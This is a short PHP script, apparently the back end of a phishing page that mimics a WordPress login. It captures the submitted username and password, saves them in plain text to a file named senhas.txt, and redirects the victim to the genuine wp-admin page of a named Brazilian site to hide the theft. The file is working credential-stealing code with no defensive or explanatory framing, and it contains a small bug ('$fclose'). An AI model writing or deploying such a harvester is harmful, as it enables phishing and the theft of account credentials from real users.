<?php
$usuario = $_POST['user_login'];
$senha = $_POST['user_pass'];
$tudo = "Usuário: ".$usuario." - Senha: ".$senha;
 
$fp = fopen("senhas.txt", "w");
fwrite($fp, $tudo);
$fclose($fp);
header("Location: https://pavi.com.br/wp-admin/");
?>